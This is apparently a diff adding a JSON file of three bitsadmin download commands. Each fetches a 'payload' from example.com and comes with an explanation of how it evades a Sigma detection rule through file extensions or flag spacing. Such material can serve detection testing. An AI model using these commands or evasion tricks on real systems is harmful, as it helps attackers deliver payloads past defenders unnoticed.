@@ -1,0 +1,14 @@
+[
+  {
+    "output": "bitsadmin /transfer myjob /download /priority normal http://example.com/payload.tmp C:\\Users\\Public\\payload.tmp",
+    "explanation": "The Sigma rule relies on a hardcoded, finite list of extensions in the 'selection_extension' condition. By downloading a file with an unmonitored extension (such as .tmp or .bin) or no extension at all, the command line string will not match any of the strings in the list. This causes the 'all of selection_*' condition to evaluate to false. An adversary can simply download the file this way and use the native 'rename' or 'move' commands afterward to give it an executable extension."
+  },
+  {
+    "output": "bitsadmin.exe /transfer/DownloadJob /download /priority normal http://example.com/payload.dll C:\\Windows\\Tasks\\payload.dll",
+    "explanation": "The rule enforces an 'all of selection_*' logic block. The 'selection_flags' section explicitly expects a leading and trailing space around the flags (e.g., ' /transfer '). By stripping the trailing space or tightly appending the parameter metadata immediately after the flag identifier (e.g., '/transfer/DownloadJob'), bitsadmin natively parses the parameters correctly while breaking the explicit string signature requirement."
+  },
+  {
+    "output": "bitsadmin.exe /transfer MyJob http://example.com/payload C:\\Windows\\Tasks\\payload",
+    "explanation": "The 'selection_extension' criteria looks for specific, static, suspicious extensions inside the command line parameters. If the remote file does not contain an extension in the URL path (handled via custom HTTP routing or default index configurations) and the destination filename is saved without an extension (e.g., just 'payload'), the command bypasses the strict string selection entirely. The payload can then be renamed or executed locally using specialized tools."
+  }
+]
